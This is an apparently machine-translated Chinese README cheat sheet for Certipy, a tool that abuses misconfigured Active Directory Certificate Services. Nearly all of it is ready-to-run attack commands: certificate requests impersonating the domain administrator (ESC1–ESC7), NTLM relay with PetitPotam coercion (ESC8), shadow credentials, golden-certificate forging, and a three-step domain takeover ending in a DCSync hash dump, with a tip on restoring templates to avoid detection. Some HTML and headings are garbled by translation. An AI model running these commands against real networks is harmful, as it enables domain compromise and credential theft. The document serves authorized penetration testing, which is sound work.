<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🏛️ Certipy - 完整备忘单

[🇹🇷 Türkçe Sürüm]（翻译/README.tr.md）
```
   ██████╗███████╗██████╗ ████████╗██╗██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗╚██╗ ██╔╝
  ██║     █████╗  ██████╔╝   ██║   ██║██████╔╝ ╚████╔╝ 
  ██║     ██╔══╝  ██╔══██╗   ██║   ██║██╔═══╝   ╚██╔╝  
  ╚██████╗███████╗██║  ██║   ██║   ██║██║        ██║   
   ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝╚═╝        ╚═╝   
       Active Directory Certificate Services (AD CS) Abuse
```
<p对齐=“中心”>
  <img src="https://img.shields.io/badge/Certipy-AD_CS_Abuse-blue?style=for-the-badge" alt="Certipy">
  <img src="https://img.shields.io/badge/ESC1_to_ESC15-Vulnerability-red?style=for-the-badge" alt="ESC1-ESC15">
  <img src="https://img.shields.io/badge/PKINIT-Kerberos_Auth-orange?style=for-the-badge" alt="PKINIT">
  <img src="https://img.shields.io/badge/Active_Directory-Privilege_Escalation-green?style=for-the-badge" alt="AD PrivEsc">
</p>

<p对齐=“中心”>
  <b>🔑 用于枚举和利用 Active Directory 证书服务 (AD CS) 错误配置的综合工具</b>
</p>

---

## 📋 目录

- [简介](#-简介)
- [为什么 AD CS 滥用？](#-why-ad-cs-abuse)
- [安装](#-安装)
- [Certipy 子命令概述](#-certipy-subcommands-overview)
- [枚举与发现 (`find`)](#-enumeration--discovery-find)
- [ESC 漏洞矩阵](#-the-esc-vulnerability-matrix)
  - [ESC1：登记者用品主题备用名称 (SAN)](#esc1-enrollee-supplies-subject-alt-name-san)
  - [ESC2：任何目的 EKU 或 SubCA](#esc2-any- Purpose-eku-or-subca)
  - [ESC3：证书请求代理](#esc3-certificate-request-agent)
  - [ESC4：有漏洞的模板访问控制 (ACL)](#esc4-vulnerable-template-access-control-acl)
  - [ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 已启用](#esc6-editf_attributesubjectaltname2-enabled)
  - [ESC7：存在漏洞的 CA 访问控制](#esc7-vulnerable-ca-access-control)
  - [ESC8：NTLM 中继到 HTTP Web 注册](#esc8-ntlm-relay-to-http-web-enrollment)
  - [ESC9 和 ESC10：强证书映射缺陷](#esc9--esc10-strong-certificate-mapping-flaws)
- [影子凭证 (`shadow`)](#-shadow-credentials-shadow)
- [黄金证书 (`forge`)](#-golden-certificates-forge)
- [使用 PFX (`auth`) 进行身份验证](#-authentiating-with-pfx-auth)
- [真实世界攻击工作流程](#-real-world-attack-workflows)
- [快速参考表](#-quick-reference-table)
- [提示和最佳实践](#-tips--best-practices)
- [法律免责声明](#-legal-disclaimer)
- [资源](#-资源)

---

## 🎯 简介

**Certipy**（由 Oliver Lyak 创建）是用于枚举和利用 Active Directory 证书服务 (**AD CS**) 的首要基于 Python 的工具。 AD CS 是 Microsoft 针对企业 Active Directory 网络的公钥基础设施 (PKI) 实现，广泛用于智能卡登录、VPN、S/MIME 和内部 TLS 加密。

由于证书配置错误经常允许非特权域用户以域管理员或域控制器的身份请求证书，因此 AD CS 滥用是现代企业渗透测试中最可靠和最有影响力的域升级向量之一。

---

## ⚖️ 为什么 AD CS 滥用？

- ⚡ **即时域升级：** 配置错误的证书模板通常会在几秒钟内导致域范围内的妥协。
- 🔑 **隐蔽且持久：** 被盗证书或伪造的黄金证书可以保持多年有效，而不会触发标准密码更改警报。
- 🔄 **PKINIT 到 NT 哈希：** Certipy 通过 Kerberos PKINIT 对请求的 `.pfx` 证书进行身份验证，直接从 KDC 检索目标的明文 NT 哈希。

---

## 📥 安装

### 使用 pipx（推荐）
```bash
pipx install certipy-ad
```
### 来自 GitHub 存储库
```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```
＃＃＃ 确认
```bash
certipy -h
```
---

## 🧭 Certipy 子命令概述

|子命令 |功能|
|------------|----------|
| `find` |枚举 CA、模板并检测 ESC 漏洞 |
| `req` |从易受攻击的模板请求证书 |
| `auth` |使用 `.pfx` 证书进行身份验证以检索 TGT 和 NT 哈希 |
| `ca` |枚举和修改 CA 配置设置 |
| `template` |修改证书模板设置（ESC4中有用）|
| `account` |管理 Active Directory 计算机帐户 (MachineAccountQuota) |
| `shadow` |利用影子凭证 (`msDS-KeyCredentialLink`) |
| `forge` |使用被盗的 CA 私钥伪造黄金证书 |

---

## 🔍 枚举与发现 (`find`)

首先识别企业证书颁发机构 (CA) 并扫描易受攻击的模板：
```bash
# Enumerate all CAs and templates with standard credentials
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1

# Print vulnerable templates directly to terminal
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -vulnerable -stdout

# Output results formatted for BloodHound
certipy find -u 'john.doe@corp.local' -p 'P@ssword123' -dc-ip 10.10.10.1 -bloodhound
```
---

## 💥 ESC 漏洞矩阵

### ESC1：登记者提供主题备用名称 (SAN)

**条件：**
- 低权限用户拥有注册权限（启用 `Client Authentication` EKU）。
- 模板指定 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`（允许请求者指定任何主题备用名称，例如域管理员）。

**开发：**
```bash
# 1. Request certificate on behalf of Domain Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'VulnerableTemplate' \
  -upn 'administrator@corp.local' \
  -dc-ip 10.10.10.1

# 2. Authenticate with resulting administrator.pfx via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
*输出产生管理员的 TGT 和明文 NT 哈希！*

---

### ESC2：任何目的 EKU 或 SubCA

**条件：**
- 模板指定 `Any Purpose` EKU 或未定义 EKU。
- 可用于任何目的，包括客户端身份验证。

**利用：**
与 ESC1 相同地利用或与 ESC3 结合使用以获得注册代理证书。

---

### ESC3：证书请求代理

**条件：**
- 模板具有 `Certificate Request Agent` EKU（注册代理）。
- 允许代表另一个用户跨辅助模板请求证书。

**开发：**
```bash
# 1. Request Enrollment Agent certificate
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'AgentTemplate' -dc-ip 10.10.10.1

# 2. Use the agent certificate to request on behalf of Administrator
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'UserTemplate' \
  -on-behalf-of 'CORP\administrator' \
  -pfx john.pfx -dc-ip 10.10.10.1

# 3. Authenticate with the obtained Administrator PFX
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
---

### ESC4：存在漏洞的模板访问控制 (ACL)

**条件：**
- 低权限用户对证书模板具有 `WriteOwner`、`WriteDacl` 或 `WriteProperty` 权限。

**开发：**
```bash
# 1. Overwrite template configuration to make it vulnerable to ESC1
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -save-old \
  -dc-ip 10.10.10.1

# 2. Request certificate as Administrator (ESC1)
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'TargetTemplate' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1

# 3. Restore original template configuration to avoid detection
certipy template -u 'john.doe@corp.local' -p 'P@ssword123' \
  -template 'TargetTemplate' \
  -configuration TargetTemplate.json -dc-ip 10.10.10.1
```
---

### ESC6：EDITF_ATTRIBUTESUBJECTALTNAME2 已启用

**条件：**
- CA 设置了 `EDITF_ATTRIBUTESUBJECTALTNAME2` 标志，允许任何证书请求指定任意 SAN，无论模板设置如何！

**开发：**
```bash
# Request certificate as Administrator using any template allowing Client Auth (e.g. default 'User')
certipy req -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -template 'User' \
  -upn 'administrator@corp.local' -dc-ip 10.10.10.1
```
---

### ESC7：易受攻击的 CA 访问控制

**条件：**
- 用户对 CA 本身拥有 `ManageCA` 或 `ManageCertificates` 权限。

**开发：**
```bash
# 1. Add yourself as Officer on the CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -add-officer 'john.doe' -dc-ip 10.10.10.1

# 2. Enable vulnerable template on CA
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -enable-template 'SubCA' -dc-ip 10.10.10.1

# 3. Issue and retrieve previously denied request
certipy ca -u 'john.doe@corp.local' -p 'P@ssword123' \
  -ca 'CORP-CA' \
  -issue-request <REQUEST_ID> -dc-ip 10.10.10.1
```
---

### ESC8：NTLM 中继到 HTTP Web 注册

**条件：**
- CA 的 Web 注册 HTTP 端点 (`/certsrv/`) 启用了 NTLM 身份验证，无需 EPA（身份验证扩展保护）和 HTTPS。

**利用工作流程：**
1. 启动 `ntlmrelayx` 并指向 CA Web Enrollment：
   ```bash
   impacket-ntlmrelayx -t http://10.10.10.50/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```
2.通过PetitPotam或PrinterBug触发强制机器认证：
   ```bash
   python3 petitpotam.py 192.168.1.100 10.10.10.1
   ```
3. `ntlmrelayx` 中继 DC 的机器帐户 NTLM 身份验证，请求计算机证书，并输出 base64 `.pfx`。
4. 使用 Certipy 作为域控制器进行身份验证：
   ```bash
   certipy auth -pfx dc01.pfx -dc-ip 10.10.10.1
   ```
5. 使用 DC 的 NT 哈希通过 `impacket-secretsdump` 执行完整 DCSync 转储。

---

## 👥 影子凭证 (`shadow`)

如果受感染的帐户对另一个帐户的 `msDS-KeyCredentialLink` 属性具有写入权限：
```bash
# Automatically write key credential, authenticate via PKINIT, and recover target NT hash
certipy shadow auto -u 'john.doe@corp.local' -p 'P@ssword123' \
  -account 'TARGET_USER' \
  -dc-ip 10.10.10.1
```
---

## 👑 黄金证书 (`forge`)

如果您已经破坏了 CA 并提取了其私钥：
```bash
# Forge a Golden Certificate valid for any user without contacting the CA
certipy forge -ca-pfx ca_private.pfx \
  -upn 'administrator@corp.local' \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'

# Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```
---

## 🔑 使用 PFX 进行身份验证 (`auth`)
```bash
# Retrieve TGT and NT hash via PKINIT
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Save TGT to ccache for Kerberos ticketing
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1 -ldap-shell
```
---

## 🎬 真实世界的攻击工作流程

### 用 3 个命令完成 ESC1 域接管
```bash
# Step 1: Discover ESC1 template
certipy find -u 'alice@domain.local' -p 'Summer2026!' -dc-ip 10.10.10.1 -vulnerable -stdout

# Step 2: Request certificate as Administrator
certipy req -u 'alice@domain.local' -p 'Summer2026!' \
  -ca 'Domain-CA' \
  -template 'SmartCardUser' \
  -upn 'administrator@domain.local' \
  -dc-ip 10.10.10.1

# Step 3: Extract NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1

# Step 4: Full DCSync dump
impacket-secretsdump -hashes :<EXTRACTED_NT_HASH> 'domain.local/administrator@10.10.10.1'
```
---

## 📊 快速参考表

|任务|命令 |
|------|---------|
| **枚举 AD CS** | `certipy find -u u@d -p p -dc-ip <IP> -vulnerable -stdout` |
| **请求证书 (ESC1)** | `certipy req -u u@d -p p -ca <CA> -template <T> -upn admin@d -dc-ip <IP>` |
| **验证 PFX** | `certipy auth -pfx <file>.pfx -dc-ip <IP>` |
| **修改模板(ESC4)**| `certipy template -u u@d -p p -template <T> -save-old -dc-ip <IP>` |
| **影子凭证** | `certipy shadow auto -u u@d -p p -account <TARGET> -dc-ip <IP>` |
| **管理 CA 权利** | `certipy ca -u u@d -p p -ca <CA> -add-officer <u> -dc-ip <IP>` |
| **锻造金证书** | `certipy forge -ca-pfx ca.pfx -upn admin@d -subject <DN>` |

---

## 💡 提示和最佳实践

1. **检查直流时钟同步：**
   Kerberos PKINIT 要求您的系统时间在域控制器的 5 分钟内同步。跑步：
   ```bash
   sudo rdate -n 10.10.10.1
   # or
   sudo ntpdate 10.10.10.1
   ```
2. **处理KDC_ERR_PADATA_TYPE_NOSUPP：**
   如果 `certipy auth` 因此错误而失败，则域控制器没有为 PKINIT 安装有效的域控制器证书。在这种情况下，请使用 LDAP 或 SChannel 身份验证。
3. **始终清理 ESC4 模板：**
   更改证书模板时，请始终保留并重新应用备份配置 (`-configuration <FILE>.json`)，以避免使环境容易受到攻击或导致操作中断。

---

## ⚠️ 法律免责声明

> **重要提示：** Active Directory 证书服务攻击可跨域网络授予关键的、高影响力的管理访问权限。 Certipy 只能在经过书面许可的授权渗透测试、红队演习和道德安全审计期间执行。

---

## 📚 资源

- [Certipy 官方 GitHub 存储库](https://github.com/ly4k/Certipy)
- [认证二手白皮书 (SpecterOps)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [AD CS 攻击路径和保护 (Oliver Lyak)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)